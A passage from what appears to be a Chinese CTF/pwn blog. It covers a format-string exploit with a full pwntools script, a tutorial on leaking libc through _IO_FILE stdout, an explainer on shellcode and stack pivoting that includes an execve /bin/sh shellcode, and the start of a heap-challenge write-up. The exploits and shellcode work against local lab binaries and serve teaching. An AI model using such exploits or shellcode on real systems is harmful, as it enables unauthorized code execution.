&#125; while ( strcmp(s1, &quot;n&quot;) &amp;&amp; strcmp(s1, &quot;N&quot;) ); puts(&quot;Yukkri prepared a gift for you: &quot;); read(0, str, 0x100uLL); printf(str); return __readfsqword(0x28u) ^ v4;&#125; 跟进一下print_str函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061int __fastcall print_str(const char *a1)&#123; int n; // [rsp+1Ch] [rbp-24h] int ii; // [rsp+20h] [rbp-20h] int l; // [rsp+24h] [rbp-1Ch] int m; // [rsp+28h] [rbp-18h] int i; // [rsp+2Ch] [rbp-14h] int k; // [rsp+30h] [rbp-10h] int v8; // [rsp+34h] [rbp-Ch] const char *j; // [rsp+38h] [rbp-8h] v8 = strlen(a1); if ( v8 &gt; 20 ) &#123; if ( v8 &gt; 50 ) &#123; printf(&quot;%*s&quot;, 51, (const char *)&amp;unk_402008); for ( i = 0; i &lt;= 51; ++i ) putchar(95); printf(&quot;\\n%*s/ %*s \\\\\\n&quot;, 50, (const char *)&amp;unk_402008, 50, (const char *)&amp;unk_402008); for ( j = a1; j &lt; &amp;a1[v8]; j += 50 ) printf(&quot;%*s| %-50.50s |\\n&quot;, 50, (const char *)&amp;unk_402008, j); printf(&quot;%*s\\\\___ &quot;, 50, (const char *)&amp;unk_402008); for ( k = 0; k &lt;= 46; ++k ) putchar(95); &#125; else &#123; printf(&quot;%*s&quot;, 51, (const char *)&amp;unk_402008); for ( l = 0; l &lt;= v8 + 1; ++l ) putchar(95); printf(&quot;\\n%*s/ %*s \\\\\\n&quot;, 50, (const char *)&amp;unk_402008, v8, (const char *)&amp;unk_402008); printf(&quot;%*s| %s |\\n&quot;, 50, (const char *)&amp;unk_402008, a1); printf(&quot;%*s\\\\___ &quot;, 50, (const char *)&amp;unk_402008); for ( m = 0; m &lt; v8 - 3; ++m ) putchar(95); &#125; &#125; else &#123; printf(&quot;%*s&quot;, 51, (const char *)&amp;unk_402008); for ( n = 0; n &lt;= 21; ++n ) putchar(95); printf(&quot;\\n%*s/ %*s \\\\\\n&quot;, 50, (const char *)&amp;unk_402008, 20, (const char *)&amp;unk_402008); printf( &quot;%*s| %*s%s%*s |\\n&quot;, 50, (const char *)&amp;unk_402008, (20 - v8) / 2 + v8 % 2, (const char *)&amp;unk_402008, a1, (20 - v8) / 2, (const char *)&amp;unk_402008); printf(&quot;%*s\\\\___ &quot;, 50, (const char *)&amp;unk_402008); for ( ii = 0; ii &lt;= 16; ++ii ) putchar(95); &#125; puts(&quot;/&quot;); printf(&quot;%*s|/\\n&quot;, 54, (const char *)&amp;unk_402008); return printf(&quot;%s&quot;, yukkuri);&#125; 直接看不好看懂 直接运行一下脚本 发现是一个图形 分析一下题目给我们的机会 首先是可以无限循环对栈上数据0x100字节大小的修改 并且还可以泄露栈上的数据 然后还有一次非栈上格式化字符串漏洞的机会 这题要想获取shell 只能通过覆盖ret addr 但是由于开启了canary 常规的栈溢出行不通 write泄露的栈内容长度又够不到canary 那么只能想办法通过非栈上格式化字符串漏洞来任意写到栈上的ret addr 使其为onegadget 这样就可以成功获取shell 那么我们就需要泄露栈地址和libc基址 gdb动调看一下 当我们输入的payload大于0x50字节的时候 断点打在0x4014EF处 我们发现payload&#x3D; cyclic(0x100)时 可以泄露出栈上的地址 当我们输入的payload &#x3D; cyclic(0x98)时 可以泄露出stderr的真实地址 我们成功获得了栈地址和libc基址 123456789101112131415161718192021222324252627282930from pwn import *context.log_level = &quot;debug&quot;def splitaddr(target_addr): addr = [] curr = 0 for _ in range(4): num = target_addr % 65536 tmp = (num - curr + 65536) % 65536 addr.append(tmp) curr = (curr + tmp) % 65536 target_addr = target_addr &gt;&gt; 16 return addrio = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)libc =ELF(&quot;./libc-2.31.so&quot;)io.recvuntil(&quot;What would you like to let Yukkri say?&quot;)payload = cyclic(0x98)io.send(payload)addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = addr - libc.sym[&#x27;_IO_2_1_stderr_&#x27;]success(hex(libc_addr))io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;Y&#x27;)payload = cyclic(0x100)io.send(payload)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x8success(hex(stack_addr))io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;Y&#x27;) 首先由于非栈上格式化字符串并没有办法直接对栈数据更改 所以我们还需要先修改栈上的数据 123456payload = p64(stack_addr)payload += p64(stack_addr+2)payload += p64(stack_addr+4)payload += p64(stack_addr+6)io.send(payload)io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;n&#x27;) 非栈上格式化字符串会在栈专题中讲 所以这里就不解释为什么这么写了 最后的关键在于说ret addr的地址是在哪里 我们上面动调也可以看到 是位于stack_addr-0x8处 所以这里任意写其内容为onegadget 完整exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *context.log_level = &quot;debug&quot;def splitaddr(target_addr): addr = [] curr = 0 for _ in range(4): num = target_addr % 65536 tmp = (num - curr + 65536) % 65536 addr.append(tmp) curr = (curr + tmp) % 65536 target_addr = target_addr &gt;&gt; 16 return addrio = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)libc =ELF(&quot;./libc-2.31.so&quot;)io.recvuntil(&quot;What would you like to let Yukkri say?&quot;)payload = cyclic(0x98)io.send(payload)addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc_addr = addr - libc.sym[&#x27;_IO_2_1_stderr_&#x27;]success(hex(libc_addr))io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;Y&#x27;)payload = cyclic(0x100)io.send(payload)stack_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x8success(hex(stack_addr))io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;Y&#x27;)payload = p64(stack_addr)payload += p64(stack_addr+2)payload += p64(stack_addr+4)payload += p64(stack_addr+6)io.send(payload)io.sendlineafter(&quot;anything else?(Y/n)&quot;,b&#x27;n&#x27;)onegadget_addr = 0xe3b01+libc_addraddr = splitaddr(onegadget_addr)payload = b&quot;%&quot; + str(addr[0]).encode() + b&quot;lx%8$hn&quot;payload += b&quot;%&quot; + str(addr[1]).encode() + b&quot;lx%9$hn&quot;payload += b&quot;%&quot; + str(addr[2]).encode() + b&quot;lx%10$hn&quot;payload += b&quot;%&quot; + str(addr[3]).encode() + b&quot;lx%11$hn&quot;io.send(payload+b&#x27;\\x00&#x27;)io.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"iofile泄露libc基址","slug":"iofile泄露libc基址","date":"2023-01-01T09:21:57.000Z","updated":"2023-01-01T10:05:04.878Z","comments":true,"path":"2023/01/01/iofile泄露libc基址/","link":"","permalink":"http://example.com/2023/01/01/iofile%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9D%80/","excerpt":"","text":"部分堆题没有给予我们打印堆块中间的机会 这种情况下 无法通过unsortedbin来泄露基址 这里学习一种新办法 通过io file来泄露基址 在一个程序中 初始的文件描述符为1,2,3 分别对应着标准输入 标准输出 标准错误 当我们调用scanf函数或者read函数的时候 就会通过调用文件描述符0来从终端输入数据 也就意味着我们可以利用这一点来做到泄露数据 在linux系统中的IO库 存在FILE文件流来描述文件 其初始创建的三个文件stdin、stdout、stderr位于libc上 而接下来创建的位于堆中 并且其是一个单向链表结构 定义此结构体为_IO_FILE_plus 12345struct _IO_FILE_plus&#123; _IO_FILE file; _IO_jump_t *vtable;&#125; libc2.23以后 有一个全局变量_IO_list_all 指向了FILE文件的链表头 随便打开一个程序 gdb看一下_IO_list_all的内容 1234567891011121314151617181920212223242526272829303132333435pwndbg&gt; p /x *(struct _IO_FILE_plus *) _IO_list_all$14 = &#123; file = &#123; _flags = 0xfbad2086, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7dce760, _fileno = 0x2, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = &#123;0x0&#125;, _lock = 0x7ffff7dcf8b0, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x7ffff7dcd780, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = &#123;0x0 &lt;repeats 20 times&gt;&#125; &#125;, vtable = 0x7ffff7dca2a0&#125; 其中file结构中的_chain指向了下一个FILE文件 即stdout 而stdout指向stdin vtable则是一个指针 跟进一下其内容 123456789101112131415161718192021222324pwndbg&gt; p _IO_file_jumps$19 = &#123; __dummy = 0, __dummy2 = 0, __finish = 0x7ffff7a6e2d0 &lt;_IO_new_file_finish&gt;, __overflow = 0x7ffff7a6f2b0 &lt;_IO_new_file_overflow&gt;, __underflow = 0x7ffff7a6efd0 &lt;_IO_new_file_underflow&gt;, __uflow = 0x7ffff7a70370 &lt;__GI__IO_default_uflow&gt;, __pbackfail = 0x7ffff7a71c00 &lt;__GI__IO_default_pbackfail&gt;, __xsputn = 0x7ffff7a6d8d0 &lt;_IO_new_file_xsputn&gt;, __xsgetn = 0x7ffff7a6d530 &lt;__GI__IO_file_xsgetn&gt;, __seekoff = 0x7ffff7a6cb30 &lt;_IO_new_file_seekoff&gt;, __seekpos = 0x7ffff7a70940 &lt;_IO_default_seekpos&gt;, __setbuf = 0x7ffff7a6c7f0 &lt;_IO_new_file_setbuf&gt;, __sync = 0x7ffff7a6c670 &lt;_IO_new_file_sync&gt;, __doallocate = 0x7ffff7a600b0 &lt;__GI__IO_file_doallocate&gt;, __read = 0x7ffff7a6d8b0 &lt;__GI__IO_file_read&gt;, __write = 0x7ffff7a6d130 &lt;_IO_new_file_write&gt;, __seek = 0x7ffff7a6c8b0 &lt;__GI__IO_file_seek&gt;, __close = 0x7ffff7a6c7e0 &lt;__GI__IO_file_close&gt;, __stat = 0x7ffff7a6d120 &lt;__GI__IO_file_stat&gt;, __showmanyc = 0x7ffff7a71d80 &lt;_IO_default_showmanyc&gt;, __imbue = 0x7ffff7a71d90 &lt;_IO_default_imbue&gt;&#125; 其指向了_IO_file_jumps结构 该结构为所有的FILE文件所共用 存储的是一些函数的指针 我们也可以通过修改这些函数指针或者在可写区域伪造一个vtable结构 不过本文不做介绍 自行了解 回到FILE文件结构体 你在一系列变量中可以找到_fileno 其对应的值就是文件描述符 这里也存在利用漏洞 1234567891011121314151617181920212223242526272829303132333435pwndbg&gt; p _IO_2_1_stdin_$20 = &#123; file = &#123; _flags = -72540024, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 &#x27;\\000&#x27;, _shortbuf = &quot;&quot;, _lock = 0x7ffff7dcf8d0 &lt;_IO_stdfile_0_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7dcdae0 &lt;_IO_wide_data_0&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = &#x27;\\000&#x27; &lt;repeats 19 times&gt; &#125;, vtable = 0x7ffff7dca2a0 &lt;_IO_file_jumps&gt;&#125; 如果程序通过文件描述符4将flag的值读入 那么我们可以通过修改1 2 3文件描述符的值来达到攻击目的 这里同样不扩展 那么我们是如何通过FILE文件结构达到泄露基址的目的呢? 让我们阅读一下puts函数的源码 12345678910111213141516171819#include &quot;libioP.h&quot;#include &lt;string.h&gt;#include &lt;limits.h&gt;int_IO_puts (const char *str)&#123; int result = EOF; size_t len = strlen (str); _IO_acquire_lock (stdout); if ((_IO_vtable_offset (stdout) != 0 || _IO_fwide (stdout, -1) == -1) &amp;&amp; _IO_sputn (stdout, str, len) == len &amp;&amp; _IO_putc_unlocked (&#x27;\\n&#x27;, stdout) != EOF) result = MIN (INT_MAX, len + 1); _IO_release_lock (stdout); return result;&#125;weak_alias (_IO_puts, puts)libc_hidden_def (_IO_puts) 其调用了一个关键函数 _IO_sputn 我们需要跟进一下该函数 1extern size_t _IO_new_file_xsputn (FILE *, const void *, size_t); 执行sputn函数的过程中同时执行了_IO_new_file_xsputn继续跟进发现 其调用了_IO_overflow函数 这个函数是否眼熟? 其存在于我们上面介绍的vtable结构中 最后我们来看起决定作用的_IO_new_file_overflow函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657int_IO_new_file_overflow (FILE *f, int ch)&#123; if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ &#123; f-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; &#125; /* If currently reading or no buffer allocated. */ if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL) &#123; /* Allocate a buffer if needed. */ if (f-&gt;_IO_write_base == NULL) &#123; _IO_doallocbuf (f); _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base); &#125; /* Otherwise must be currently reading. If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end, logically slide the buffer forwards one block (by setting the read pointers to all point at the beginning of the block). This makes room for subsequent output. Otherwise, set the read pointers to _IO_read_end (leaving that alone, so it can continue to correspond to the external position). */ if (__glibc_unlikely (_IO_in_backup (f))) &#123; size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr; _IO_free_backup_area (f); f-&gt;_IO_read_base -= MIN (nbackup, f-&gt;_IO_read_base - f-&gt;_IO_buf_base); f-&gt;_IO_read_ptr = f-&gt;_IO_read_base; &#125; if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end) f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base; f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr; f-&gt;_IO_write_base = f-&gt;_IO_write_ptr; f-&gt;_IO_write_end = f-&gt;_IO_buf_end; f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end; f-&gt;_flags |= _IO_CURRENTLY_PUTTING; if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) f-&gt;_IO_write_end = f-&gt;_IO_write_ptr; &#125; if (ch == EOF) return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; *f-&gt;_IO_write_ptr++ = ch; if ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &#x27;\\n&#x27;)) if (_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF) return EOF; return (unsigned char) ch;&#125; 首先我们需要绕过第一个if判断 那么就使得f-&gt;_flags &amp; _IO_NO_WRITES为0 接下要绕过第二个判断 那么使得(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)为1 最后其调用了_IO_do_write函数 该函数实际上是new_do_write函数 1234567891011121314151617181920212223242526272829static size_tnew_do_write (FILE *fp, const char *data, size_t to_do)&#123; size_t count; if (fp-&gt;_flags &amp; _IO_IS_APPENDING) /* On a system without a proper O_APPEND implementation, you would need to sys_seek(0, SEEK_END) here, but is not needed nor desirable for Unix- or Posix-like systems. Instead, just indicate that offset (before and after) is unpredictable. */ fp-&gt;_offset = _IO_pos_BAD; else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base) &#123; off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-&gt;_offset = new_pos; &#125; count = _IO_SYSWRITE (fp, data, to_do); if (fp-&gt;_cur_column &amp;&amp; count) fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1; _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base); fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base; fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end); return count;&#125; 而else if判断式中的fp-&gt;_IO_write_base - fp-&gt;_IO_read_end我们满足不了 如果fp-&gt;_IO_read_end的值设置为0 那么_IO_SYSSEEK的第二个参数值就会过大 如果设置fp-&gt;_IO_write_base = fp-&gt;_IO_read_end的话 那么在其它地方就会有问题 因为fp-&gt;_IO_write_base 不能大于 fp-&gt;_IO_write_end 所以这里要设置fp-&gt;_flags | _IO_IS_APPENDING，避免进入else if 分支 综上所述 因此我们要泄露基址的话 需要将flag改为0xfbad1800 并且随着第四个参数_IO_write_base的不同 可以泄露不同的libc地址(原理不懂 照抄吧) 1payload = p64(0xfbad1800)+p64(0)*3+b&quot;\\x58&quot; //泄露_IO_file_jumps 1payload = p64(0xfbad3887)+p64(0)*3+p8(0) //泄露_IO_2_1_stdin_","categories":[{"name":"堆","slug":"堆","permalink":"http://example.com/categories/%E5%A0%86/"}],"tags":[]},{"title":"对于shellcode的一些理解","slug":"对于shellcode的一些理解","date":"2022-12-19T07:50:51.000Z","updated":"2022-12-22T12:03:42.276Z","comments":true,"path":"2022/12/19/对于shellcode的一些理解/","link":"","permalink":"http://example.com/2022/12/19/%E5%AF%B9%E4%BA%8Eshellcode%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/","excerpt":"","text":"仅凭一段机器码 为什么shellcode可以篡改程序执行流 使其达到我们想要的结果 并且shellcode不同于rop链 并不能只是简单的覆盖ret addr为shellcode就可以达到效果 二者不同在哪里？ 为什么bss段如果没有可执行权限的话就不能执行shellcode 但是同样的情况下就可以通过在bss段上写入rop链 随后栈迁移来控制程序执行流？ 这些疑问一一来解决一下 首先 什么是shellcode? wiki上是这样定义的: 1In computer security, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called &quot;shellcode&quot; because it typically starts a command shell from which the attacker can control the compromised machine, but any piece of code that performs a similar task can be called shellcode. 其是一段机器码 用来启动一个命令界面 攻击者可以用其来控制漏洞机器 通常的shellcode长什么样？ 1\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05 上面是一段23字节的64位shellcode 可以用来执行system(&#x2F;bin&#x2F;sh) 编写下面的程序 并且把NX保护关闭 123456789101112#include&lt;stdio.h&gt;char magic[200];int main()&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); char a[20]; puts(&quot;this is a test&quot;); puts(&quot;input shellcode to bss&quot;); read(0,magic,0x200); puts(&quot;modify the retaddr&quot;); read(0,a,0x200);&#125; 向bss段中写入shellcode 并且修改retaddr为magic数组的首地址 但是如果想要直接覆盖ret addr为shellcode那么就无法达到同样的攻击效果 这是因为覆盖ret addr 实际上利用栈帧结束后 自带的两行指令 leave 和ret(外平栈) 来使esp和ebp指针指向父函数的栈帧 继续执行上一步操作 也就是说 ret add需要是一个地址 指向一连串的指令或者是shellcode这样的字节流数据 当然了 也正是出于栈帧的这种回归到父函数的操作 延申出了一种栈溢出手法叫做 栈迁移 下文不做基础解释 而是进行一个额外的知识扩展 1234567891011from pwn import*io = process(&quot;./a.out&quot;)context.arch = &quot;amd64&quot;shellcode = b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&quot;io.recvuntil(&quot;input shellcode to bss&quot;)io.sendline(shellcode)bss_addr = 0x601060io.recvuntil(&quot;modify the retaddr&quot;)payload = cyclic(0x28)+p64(bss_addr)io.sendline(payload)io.interactive() 如果打开NX保护 也就是使bss段不可执行 那么shellcode就无法执行 但是如果我们将bss段中的数据改为一串rop链 通过栈迁移的办法 看能不能实现系统调用 12345678910111213#include&lt;stdio.h&gt;char magic[200];int main()&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); char a[20]; system(&quot;echo this is a test&quot;); puts(&quot;/bin/sh gift!&quot;); puts(&quot;input shellcode to bss&quot;); read(0,magic,0x200); puts(&quot;modify the retaddr&quot;); read(0,a,0x200);&#125; 给了system函数和字符串&#x2F;bin&#x2F;sh 很简单的rop64 不过我们不用覆盖ret addr来做 我们在bss段中构造rop链 然后栈迁移 注意此时NX保护打开了 123456789101112131415161718from pwn import*io = process(&quot;./a.out&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;io.recvuntil(&quot;input shellcode to bss&quot;)rdi_addr = 0x400753binsh_addr = 0x400788bss_addr = 0x601080system_addr = 0x400520leave_addr = 0x4006ebret_addr = 0x4004fegadget1_addr = 0x400730payload = p64(ret_addr)*100+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)io.send(payload)io.recvuntil(&quot;modify the retaddr&quot;)payload = cyclic(0x20)+p64(bss_addr-0x8)+p64(leave_addr)io.send(payload)io.interactive() 唯一不好理解的地方在于为什么要多出来一百个字长的ret指令 首先 外平栈中ret指令相当于pop eip 弹出了一个栈空间 所以相当于往低地址的方向抬高栈顶 其次 我们需要明白为什么需要抬高栈顶 如果我们不抬的话会出现什么问题？ 下面是没有p64(ret_addr)*100的情况 我们用pwndgb来查看一下此时的栈 我们本来是想要将栈迁移至0x601080 但是此时指向了0x600f00 12345678910LOAD:0000000000600F00 Elf64_Dyn &lt;2, 60h&gt; ; DT_PLTRELSZLOAD:0000000000600F10 Elf64_Dyn &lt;14h, 7&gt; ; DT_PLTRELLOAD:0000000000600F20 Elf64_Dyn &lt;17h, 400488h&gt; ; DT_JMPRELLOAD:0000000000600F30 Elf64_Dyn &lt;7, 400428h&gt; ; DT_RELALOAD:0000000000600F40 Elf64_Dyn &lt;8, 60h&gt; ; DT_RELASZLOAD:0000000000600F50 Elf64_Dyn &lt;9, 18h&gt; ; DT_RELAENTLOAD:0000000000600F60 Elf64_Dyn &lt;6FFFFFFEh, 400408h&gt; ; DT_VERNEEDLOAD:0000000000600F70 Elf64_Dyn &lt;6FFFFFFFh, 1&gt; ; DT_VERNEEDNUMLOAD:0000000000600F80 Elf64_Dyn &lt;6FFFFFF0h, 4003F6h&gt; ; DT_VERSYMLOAD:0000000000600F90 Elf64_Dyn &lt;0&gt; ; DT_NULL ida一般以load段中的内容来解析二进制文件 但是为什么esp会指向这里呢？ 此时的栈帧空间迁移到了bss段 但是栈是由高地址往低地址处写 而bss段上方不远处是got表 很明显不能这样篡改got表 因为程序无法完成正常的栈迁移 如果你尝试过往test段迁移 就不会出现这种情况 所以这里利用ret指令抬高栈顶 跨过got表 就可以成功栈迁移 同理 如果我们写入的bss段处地址离got表远一点 也可以达到同样的效果 如果你有做过一些栈迁移的题目 你会发现网上的exp迁移至的地址往往会偏差几百个字节 也是同理 123456789101112131415161718from pwn import*io = process(&quot;./a.out&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;io.recvuntil(&quot;input shellcode to bss&quot;)rdi_addr = 0x400753binsh_addr = 0x400788bss_addr = 0x601080+0x300system_addr = 0x400520leave_addr = 0x4006ebret_addr = 0x4004fegadget1_addr = 0x400730payload = cyclic(0x300)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)io.send(payload)io.recvuntil(&quot;modify the retaddr&quot;)payload = cyclic(0x20)+p64(bss_addr-0x8)+p64(leave_addr)io.send(payload)io.interactive() 这里说个题外话 这种因为bss段和got表近导致的情况还是很常见的 在出unlink题目的时候 也会遇到这种情况 不能做到任意写 但是可以通过出题的时候多声明一个全局数组 使其位于任意写的数组低地址处 详见以往的博客 至此 我们可以浅显的得出一个结论： 1.当程序没有开启NX保护的时候 并且我们得知栈地址或者bss段地址(人话:写入shellcode的地址) 可以通过ret2shellcode来解决题目 2.当程序没有打开NX保护 并且栈溢出的长度仅仅只有覆盖ret addr的长度 而且我们拥有往bss段(或者是rw-p权限的空间 即可读可写) 我们可以通过往该空间写入rop链 随后劫持esp和ebp栈迁移 要素在于理解说shellcode不同于rop链 其是一串字节流 可以达到特殊命令的字节流 同时 在日后的题目中 要小心因为bss段和got表过于近而导致的栈空间出错 并能意识到这个问题","categories":[{"name":"基础","slug":"基础","permalink":"http://example.com/categories/%E5%9F%BA%E7%A1%80/"}],"tags":[]},{"title":"hitcontraining_heapcreator","slug":"hitcontraining-heapcreator","date":"2022-12-18T16:06:42.000Z","updated":"2022-12-18T16:39:25.518Z","comments":true,"path":"2022/12/19/hitcontraining-heapcreator/","link":"","permalink":"http://example.com/2022/12/19/hitcontraining-heapcreator/","excerpt":"","text":"做完这道题又学到一种合并堆的手法 感觉收获颇丰 checksec 看一下 1234567[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 常规的64位堆菜单题 12345678910111213141516171819202122232425262728293031323334 int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf[8]; // [rsp+0h] [rbp-10h] BYREF unsigned __int64 v5; // [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u); setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); while ( 1 ) &#123; menu(); read(0, buf, 4uLL); switch ( atoi(buf) ) &#123; case 1: create_heap(); break; case 2: edit_heap(); break; case 3: show_heap(); break; case 4: delete_heap(); break; case 5: exit(0); default: puts(&quot;Invalid Choice&quot;); break; &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738unsigned __int64 create_heap()&#123; __int64 v0; // rbx int i; // [rsp+4h] [rbp-2Ch] size_t size; // [rsp+8h] [rbp-28h] char buf[8]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v5; // [rsp+18h] [rbp-18h] v5 = __readfsqword(0x28u); for ( i = 0; i &lt;= 9; ++i ) &#123; if ( !*(&amp;heaparray + i) ) &#123; *(&amp;heaparray + i) = malloc(0x10uLL); if ( !*(&amp;heaparray + i) ) &#123; puts(&quot;Allocate Error&quot;); exit(1); &#125; printf(&quot;Size of Heap : &quot;); read(0, buf, 8uLL); size = atoi(buf); v0 = *(&amp;heaparray + i); *(v0 + 8) = malloc(size); if ( !*(*(&amp;heaparray + i) + 1) ) &#123; puts(&quot;Allocate Error&quot;); exit(2); &#125; **(&amp;heaparray + i) = size; printf(&quot;Content of heap:&quot;); read_input(*(*(&amp;heaparray + i) + 1), size); puts(&quot;SuccessFul&quot;); return __readfsqword(0x28u) ^ v5; &#125; &#125; return __readfsqword(0x28u) ^ v5;&#125; 先来分析一下create函数 首先创建了一个0x10大小的堆块 并将其地址存储在bss段上的一个全局数组里面 随后让我们输入要创建的堆块大小 这里我们先将这个0x10大小的堆块称为伴随堆块 接着将创建的这个堆块的地址存储在伴随堆块的第二个字长处 并且将创建的大小存在第一个字长处 基础的堆还是很常见这种创建两个chunk的 一般利用手法就是覆盖地址 来任意地址写 这里留意一下就可以了 再来看一下edit函数 123456789101112131415161718192021222324252627unsigned __int64 edit_heap()&#123; int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(&quot;Index :&quot;); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 &lt; 0 || v1 &gt; 9 ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( *(&amp;heaparray + v1) ) &#123; printf(&quot;Content of heap : &quot;); read_input(*(*(&amp;heaparray + v1) + 1), **(&amp;heaparray + v1) + 1LL); puts(&quot;Done !&quot;); &#125; else &#123; puts(&quot;No such heap !&quot;); &#125; return __readfsqword(0x28u) ^ v3;&#125; 注意一下这个read_input函数就好了 跟进一下看是干什么的 123456789101112ssize_t __fastcall read_input(void *a1, size_t a2)&#123; ssize_t result; // rax result = read(0, a1, a2); if ( result &lt;= 0 ) &#123; puts(&quot;Error&quot;); _exit(-1); &#125; return result;&#125; 理解起来没什么难度 * (*(&amp;heaparray + v1) + 1)) 是我们创建的堆块的地址 **(&amp;heaparray + v1) + 1LL是伴随堆块的第一个字长处的内容 也就是我们输入的size 二者结合起来 这个函数就是向我们创建的堆块中输入我们之前定义好的size大小 也就是不能进行堆溢出了(不破坏堆结构的情况下) 接着再看一下show函数 1234567891011121314151617181920212223242526unsigned __int64 show_heap()&#123; int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = 